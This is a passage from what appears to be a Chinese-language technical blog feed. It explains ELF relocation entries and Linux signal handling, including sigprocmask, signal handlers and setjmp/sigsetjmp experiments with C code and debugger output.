fc                lea    -0x4(%ecx),%esp</span><br><span class="line">  38:   c3                      ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1b:   68 00 00 00 00          push   $0x0 ;对shared引用</span><br><span class="line">24:   e8 fc ff ff ff          call   25 &lt;main+0x25&gt;;对swap引用</span><br></pre></td></tr></table></figure><p>就在刚刚我们才解析了符号的地址，所以现在我们需要利用解析的符号地址把代码里引用的地址值给修正了，</p><p>我们怎么知道要去修正谁，那里修正，怎么修正，这一切都在.rel.xxx重定位表里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong>表示要修正的位置第一个字节相对于这个段的偏移，作为linker我们知道段基址，自然可以找到要修正地址</p><p>r_info 低8位表示要重定位类型，高24位是符号在符号表里的下标</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter4&gt; readelf -r a.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x1b0</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">0000001</span>c  <span class="number">00000901</span> R_386_32          <span class="number">00000000</span>   shared</span><br><span class="line"><span class="number">00000025</span>  <span class="number">00000</span>a02 R_386_PC32        <span class="number">00000000</span>   swap</span><br></pre></td></tr></table></figure><p>Info高24位 9和a正好对应</p><p><strong>readelf里的Sym. Name表示要用哪个符号修正</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line"><span class="number">9</span>:  <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND shared</span><br><span class="line"><span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND swap</span><br></pre></td></tr></table></figure><p>offset 1c和25对应要修改的位置</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1b</span>:   <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x0</span> ;对shared引用</span><br><span class="line"><span class="number">24</span>:   e8 fc ff ff ff          call   <span class="number">25</span> &lt;main+<span class="number">0x25</span>&gt;;对swap引用</span><br></pre></td></tr></table></figure><p>重定位类型类型有好多种，不同平台也可能不一样 <a href="https://bbs.kanxue.com/thread-246373.htm">https://bbs.kanxue.com/thread-246373.htm</a></p><p>这里就看两种最基本最常用的</p><p>R_386_32 绝对寻址修正</p><p>R_386_PC32 相对寻址修正</p><p>这个时候我们已经知道了符号的实际地址S和保存在被修正位置的原值A(偏移)</p><p>绝对寻址，直接把实际地址S+被修正位置的原值A填入offset就可以 </p><p>相对寻址 比上面多了减去被修正位置P，得到偏移的过程 S+A-P</p><p>重定位后的main</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">08048094</span> &lt;main&gt;:</span><br><span class="line"> <span class="number">8048094</span>:       <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">04</span>             lea    <span class="number">0x4</span>(%esp),%ecx</span><br><span class="line"> <span class="number">8048098</span>:       <span class="number">83</span> e4 f0                and    $<span class="number">0xfffffff0</span>,%esp</span><br><span class="line"> <span class="number">804809b</span>:       ff <span class="number">71</span> fc                pushl  <span class="number">-0x4</span>(%ecx)</span><br><span class="line"> <span class="number">804809</span>e:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">804809f</span>:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">80480</span>a1:       <span class="number">51</span>                      push   %ecx</span><br><span class="line"> <span class="number">80480</span>a2:       <span class="number">83</span> ec <span class="number">14</span>                sub    $<span class="number">0x14</span>,%esp</span><br><span class="line"> <span class="number">80480</span>a5:       c7 <span class="number">45</span> f4 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x6</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">80480</span>ac:       <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">80480</span>af:       <span class="number">68</span> <span class="number">6</span>c <span class="number">91</span> <span class="number">04</span> <span class="number">08</span>          push   $<span class="number">0x804916c</span></span><br><span class="line"> <span class="number">80480b</span>4:       <span class="number">8</span>d <span class="number">45</span> f4                lea    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">80480b</span>7:       <span class="number">50</span>                      push   %eax</span><br><span class="line"> <span class="number">80480b</span>8:       e8 <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">80480</span>cd &lt;swap&gt;</span><br><span class="line"> <span class="number">80480b</span>d:       <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">80480</span>c0:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line"> <span class="number">80480</span>c5:       <span class="number">8b</span> <span class="number">4</span>d fc                mov    <span class="number">-0x4</span>(%ebp),%ecx</span><br><span class="line"> <span class="number">80480</span>c8:       c9                      leave</span><br><span class="line"> <span class="number">80480</span>c9:       <span class="number">8</span>d <span class="number">61</span> fc                lea    <span class="number">-0x4</span>(%ecx),%esp</span><br><span class="line"> <span class="number">80480</span>cc:       c3                      ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     解析后的符号表</span><br><span class="line">     7: 080480cd    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line">     8: 0804916c     4 OBJECT  GLOBAL DEFAULT    3 shared</span><br><span class="line">     </span><br><span class="line">80480af:       68 6c 91 04 08          push   $0x804916c;对shared引用</span><br><span class="line">80480b8:       e8 10 00 00 00          call   80480cd &lt;swap&gt;;对swap引用</span><br></pre></td></tr></table></figure><p>6c 91 04 08 即0x804916c shared的地址</p><p>10 00 00 00 即0x00000010 0x80480b8+0x5+0x10&#x3D;0x80480CD</p><blockquote><p>相对寻址为什么原来里面偏移要填-4呢，即fffffffc(-4)？</p><p>修正的时候是按照重定位表里的当前要修正位置</p><p>程序执行是相对寻址是相对于eip的，相对于的是当前指令的下一条指令</p><p>修正时S+A-P相当于s-(p+4)，p+4即下一条指令，就统一起来</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 信号(Signal)</title>
      <link href="/2023/04/24/linux-signal/"/>
      <url>/2023/04/24/linux-signal/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux对异常的处理"><a href="#Linux对异常的处理" class="headerlink" title="Linux对异常的处理"></a>Linux对异常的处理</h2><p>陷入内核调用异常处理程序，对于故障(Fault)</p><ul><li><p>如果处理程序可以修复的故障，比如正常的缺页，修复后回到断点处继续执行</p></li><li><p>如果不能修复的，比如越级，越权，越界，除0等，linux只会给进程发送一个信号，回到用户态，进程去调度相应的信号处理程序，这样做是快速在内核态完成异常处理，减小嵌套执行异常的可能性</p></li></ul><p>linux里可以用kill -l查看信号列表，编号为1 ~ 31的信号为传统UNIX支持的信号，是不可靠信号(非实时的)，编号为32 ~ 63的信号是后来扩充的，称做可靠信号(实时信号)。不可靠信号和可靠信号的区别在于前者不支持排队，可能会造成信号丢失，而后者不会。</p><table><thead><tr><th>信号值</th><th>信号名称</th><th>说明</th><th>默认行为</th></tr></thead><tbody><tr><td>1</td><td><code>SIGHUP</code></td><td>终端断开连接</td><td>终止进程</td></tr><tr><td>2</td><td><code>SIGINT</code></td><td>终端中断符（Ctrl+C）</td><td>终止进程</td></tr><tr><td>3</td><td><code>SIGQUIT</code></td><td>终端退出符（Ctrl+\）</td><td>生成core文件并终止进程</td></tr><tr><td>4</td><td><code>SIGILL</code></td><td>非法指令</td><td>生成core文件并终止进程</td></tr><tr><td>5</td><td><code>SIGTRAP</code></td><td>跟踪断点</td><td>生成core文件并终止进程</td></tr><tr><td>6</td><td><code>SIGABRT</code></td><td>异常终止</td><td>生成core文件并终止进程</td></tr><tr><td>7</td><td><code>SIGBUS</code></td><td>总线错误</td><td>生成core文件并终止进程</td></tr><tr><td>8</td><td><code>SIGFPE</code></td><td>浮点异常</td><td>生成core文件并终止进程</td></tr><tr><td>9</td><td><code>SIGKILL</code></td><td>无条件终止</td><td>终止进程</td></tr><tr><td>10</td><td><code>SIGUSR1</code></td><td>用户定义信号1</td><td>终止进程</td></tr><tr><td>11</td><td><code>SIGSEGV</code></td><td>段错误</td><td>生成core文件并终止进程</td></tr><tr><td>12</td><td><code>SIGUSR2</code></td><td>用户定义信号2</td><td>终止进程</td></tr><tr><td>13</td><td><code>SIGPIPE</code></td><td>写入管道或套接字时，读取端已关闭</td><td>终止进程</td></tr><tr><td>14</td><td><code>SIGALRM</code></td><td>定时器信号</td><td>终止进程</td></tr><tr><td>15</td><td><code>SIGTERM</code></td><td>终止请求</td><td>终止进程</td></tr><tr><td>16</td><td><code>SIGSTKFLT</code></td><td>协处理器堆栈错误</td><td>生成core文件并终止进程</td></tr><tr><td>17</td><td><code>SIGCHLD</code></td><td>子进程状态变化</td><td>忽略信号</td></tr><tr><td>18</td><td><code>SIGCONT</code></td><td>继续执行停止的进程</td><td>忽略信号</td></tr><tr><td>19</td><td><code>SIGSTOP</code></td><td>停止进程，不能被捕捉或忽略</td><td>停止进程</td></tr><tr><td>20</td><td><code>SIGTSTP</code></td><td>终端停止符（Ctrl+Z）</td><td>停止进程</td></tr><tr><td>21</td><td><code>SIGTTIN</code></td><td>后台进程试图从终端读取</td><td>停止进程</td></tr><tr><td>22</td><td><code>SIGTTOU</code></td><td>后台进程试图向终端写入</td><td>停止进程</td></tr><tr><td>23</td><td><code>SIGURG</code></td><td>套接字上接收到紧急数据</td><td>忽略信号</td></tr><tr><td>24</td><td><code>SIGXCPU</code></td><td>CPU时间限制超时</td><td>生成core文件并终止进程</td></tr><tr><td>25</td><td><code>SIGXFSZ</code></td><td>文件大小限制超时</td><td>生成core文件并终止进程</td></tr><tr><td>26</td><td><code>SIGVTALRM</code></td><td>虚拟定时器信号</td><td>终止进程</td></tr><tr><td>27</td><td><code>SIGPROF</code></td><td>分时定时器信号</td><td>终止进程</td></tr><tr><td>28</td><td><code>SIGWINCH</code></td><td>窗口大小变化</td><td>忽略信号</td></tr><tr><td>29</td><td><code>SIGIO</code></td><td>异步I&#x2F;O事件</td><td>忽略信号</td></tr><tr><td>30</td><td>SIGPWR</td><td>电源故障</td><td>终止</td></tr><tr><td>31</td><td>SIGSYS</td><td>非法系统调用</td><td>终止</td></tr></tbody></table><p>这种信号机制，给了用户一种进程间通信机制，自定义信号处理程序的权力</p><p>linux 1 ~ 31里一种类型的信号最多只有一个待处理信号(一个发出而没有被接收处理的信号叫做待处理信号)，因为传统UNIX支持的信号是用bitflag实现的，已经置1再置1也没意思，这也是为什么叫不可靠信号的原因，后面序号的可靠信号都是通过队列来实现</p><h2 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h2><ol><li><p>内核的异常处理程序</p></li><li><p>&#x2F;bin&#x2F;kill发送</p></li></ol><blockquote><p>&#x2F;bin&#x2F;kill -signalid pid</p><p>pid为正数给pid进程 发送signalid信号</p><p>pid为负数给pid<strong>进程组</strong>所有进程发送signalid信号</p></blockquote><ol start="3"><li>键盘发送信号 ctrl c ctrl z等</li><li>kill函数显式地要求内核发送一个信号给目的进程。</li></ol><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">kill</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> sig)</span>;</span><br><span class="line">成功返回<span class="number">0</span> 否则返回<span class="number">-1</span>;</span><br><span class="line">pid &gt;<span class="number">0</span> 发送sig给进程pid;</span><br><span class="line">pid =<span class="number">0</span> 发送sig给调用进程所在进程组的每一个进程(包括自己);</span><br><span class="line">pid &lt;<span class="number">0</span> 发送sig给|pid|进程组的每一个进程</span><br></pre></td></tr></table></figure></blockquote><ol start="5"><li>alarm函数</li></ol><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">alarm</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> secs)</span>;</span><br><span class="line">在secs秒后    发送一个SIGALRM信号给调用进程 secs为<span class="number">0</span>不会调度安排新闹钟，任何情况下都会取消待处理(pending)的闹钟，返回剩余秒数，没有待处理的闹钟返回<span class="number">0</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="接受信号"><a href="#接受信号" class="headerlink" title="接受信号"></a>接受信号</h2><p>隐式阻塞机制</p><blockquote><p>内核默认阻塞任何当前处理程序正在处理信号类型的待处理的信号。也就是信号处理程序执行时不接受正在处理类型的信号</p></blockquote><p>显示阻塞机制</p><blockquote><p>应用程序可以使用 sigprocmask 函数和它的辅助函数，来设置信号屏蔽字，明确地阻塞和解除阻塞选定的信号。<strong>SIGKILL 和 SIGSTOP 不能被阻塞</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">sigset_t</span> *oldset)</span>;</span><br><span class="line">how 值：</span><br><span class="line">SIG_BLOCK:把<span class="built_in">set</span>里信号添加到blocked列表</span><br><span class="line">SIG_UNBLOCK:从blocked里删除<span class="built_in">set</span>里的信号</span><br><span class="line">SIG_SETMASK:block=<span class="built_in">set</span></span><br><span class="line">把旧的blocked保存到oldset</span><br><span class="line"><span class="built_in">set</span> 为<span class="literal">NULL</span>，读取现在的屏蔽值</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sigemptyset(<span class="type">sigset_t</span> *<span class="built_in">set</span>);</span><br><span class="line">初始化<span class="built_in">set</span>为<span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigfillset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>;</span><br><span class="line">所有信号填入<span class="built_in">set</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigaddset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">填入signum</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigdelset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">删除signum</span><br><span class="line">返回：如果成功则为 o, 若出错则为<span class="number">-1</span> 。</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigismember</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">返回：若 signum 是 <span class="built_in">set</span> 的成员则为 <span class="number">1</span>, 如果不是则为 <span class="number">0</span> 若出错则为<span class="number">-1</span></span><br></pre></td></tr></table></figure></blockquote><p>显示阻塞并不是被直接丢弃了，在恢复阻塞后，还可以接收到</p><h2 id="修改和信号相关联的默认行为"><a href="#修改和信号相关联的默认行为" class="headerlink" title="修改和信号相关联的默认行为"></a>修改和信号相关联的默认行为</h2><p>IGSTOP和SIGKILL不能修改</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">sighandler_t</span>)</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">sighandler_t</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">sighandler_t</span> handler)</span>;</span><br><span class="line">返回：若成功则为指向前次处理程序的指针，若出错则为SIG_ERRC不设置errno);</span><br><span class="line">handler 是SIG_IGN 忽略signum该类型信号;</span><br><span class="line">handler 是SIG_DFL signum恢复默认行为;</span><br><span class="line">handler 是个函数地址 设置该函数为异常处理函数</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ctrl c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGINT, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -g -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br></pre></td></tr></table></figure><p>处理程序结束后会返回到断点处继续</p><p>阻塞掉SIGINT信号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ctrl c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;mask,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGINT, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -g -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^Z</span><br><span class="line">fish: Job 6, &#x27;./test&#x27; has stopped</span><br></pre></td></tr></table></figure><h3 id="非本地跳转"><a href="#非本地跳转" class="headerlink" title="非本地跳转"></a>非本地跳转</h3><p>整数除0会SIGFPE</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">fish: Job 1, &#x27;./test&#x27; terminated by signal SIGFPE (Floating point exception)</span><br></pre></td></tr></table></figure><p>本来想着改掉SIGFPE的默认处理，看看整数除0后结果是什么样</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGFPE, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="type">int</span> z = <span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    z = z / t;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果忘了信号处理函数过后会返回到断点处，也就是导致这个异常的语句处z &#x3D; z &#x2F; t;然后就会一直导致SIGFPE，goto只能实现函数内的跳转，其实goto在汇编层就是一个无条件的跳转jmp，他也没能力实现函数间的跳转，除非他能把栈给平了，寄存器修正了</p><p>使用setjmp就可以做到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">setjmp</span><span class="params">(jmp_buf env)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigsetjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> savesigs)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">longjmp</span><span class="params">(jmp_buf env, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">siglongjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> val)</span>;</span><br></pre></td></tr></table></figure><p>setjmp把当前程序各种信息保存到env里(typically, the stack pointer, the instruction pointer,  possibly  the  values  of other registers and the signal mask),直接调用返回0，</p><p>longjmp利用最近一次保存的env来恢复之前的环境，成功调用后不返回，原来的setjmp会再次返回第二个参数val的值</p><p>sigsetjmp和setjmp差不多只是，sigsetjmp只要第二个参数不为0就会保存信号屏蔽字，jmp过来时恢复，sigset不会</p><p>手册原话</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sigsetjmp() and <span class="title function_">siglongjmp</span><span class="params">()</span></span><br><span class="line">       <span class="title function_">sigsetjmp</span><span class="params">()</span>  and  <span class="title function_">siglongjmp</span><span class="params">()</span> also perform nonlocal gotos, but provide</span><br><span class="line">       predictable handling of the process signal mask.</span><br><span class="line"></span><br><span class="line">       If, and only <span class="keyword">if</span>, the savesigs argument provided to <span class="title function_">sigsetjmp</span><span class="params">()</span> is  non‐</span><br><span class="line">       zero, the process&#x27;s current signal mask is saved in env and will be re‐</span><br><span class="line">       stored <span class="keyword">if</span> a <span class="title function_">siglongjmp</span><span class="params">()</span> is later performed with this env.</span><br></pre></td></tr></table></figure><p>sigpending()用于获取当前进程已经被阻塞但尚未处理的信号集合</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask, pendmask, blockmask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigemptyset(&amp;pendmask);</span><br><span class="line">    sigemptyset(&amp;blockmask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// if (sigsetjmp(env, 666) != 0) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (setjmp(env) != <span class="number">0</span>) &#123;</span><br><span class="line">        sigpending(&amp;pendmask);</span><br><span class="line">        sigprocmask(SIG_BLOCK, <span class="literal">NULL</span>, &amp;blockmask);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;blockmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;pendmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in pendmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in pendmask&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">2</span>);<span class="comment">//时间间隔我疯狂按ctrl c :)</span></span><br><span class="line">    <span class="comment">// siglongjmp(env, 1);</span></span><br><span class="line">    longjmp(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用sigsetjmp时</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^Cin blockmask</span><br><span class="line">in pendmask</span><br></pre></td></tr></table></figure><p>使用setjmp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^Cin blockmask</span><br><span class="line">in pendmask</span><br></pre></td></tr></table></figure><p>WTF 看来是我之前理解错了，他们都不会清除当前的信号屏蔽字和已经被阻塞但尚未处理的信号集合</p><p>gdb看下</p><p>setjmp(env) !&#x3D; 0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x env</span><br><span class="line">$<span class="number">2</span> = &#123;&#123;</span><br><span class="line">    __jmpbuf = &#123;<span class="number">0x0</span>, <span class="number">0xfa3c37809f472823</span>, <span class="number">0x7fffffffdfd8</span>, <span class="number">0x555555555269</span>, <span class="number">0x555555557d78</span>, <span class="number">0x7ffff7ffd040</span>, <span class="number">0xfa3c378098a72823</span>, <span class="number">0xaf6962d587272823</span>&#125;,</span><br><span class="line">    __mask_was_saved = <span class="number">0x0</span>,</span><br><span class="line">    __saved_mask = &#123;</span><br><span class="line">      __val = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">16</span> times&gt;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp(env, 666) !&#x3D; 0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x env</span><br><span class="line">$<span class="number">2</span> = &#123;&#123;</span><br><span class="line">    __jmpbuf = &#123;<span class="number">0x0</span>, <span class="number">0x6cdae548d2b8f980</span>, <span class="number">0x7fffffffdfd8</span>, <span class="number">0x555555555269</span>, <span class="number">0x555555557d78</span>, <span class="number">0x7ffff7ffd040</span>, <span class="number">0x6cdae548d558f980</span>, <span class="number">0x398fb01dcad2f980</span>&#125;,</span><br><span class="line">    __mask_was_saved = <span class="number">0x1</span>,</span><br><span class="line">    __saved_mask = &#123;</span><br><span class="line">      __val = &#123;<span class="number">0x2</span>, <span class="number">0x0</span> &lt;repeats <span class="number">15</span> times&gt;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp确实保存了signal mask</p><p>那应该就是sigsetjmp最后会比setjmp多一个恢复过程</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">sigset_t</span> mask, 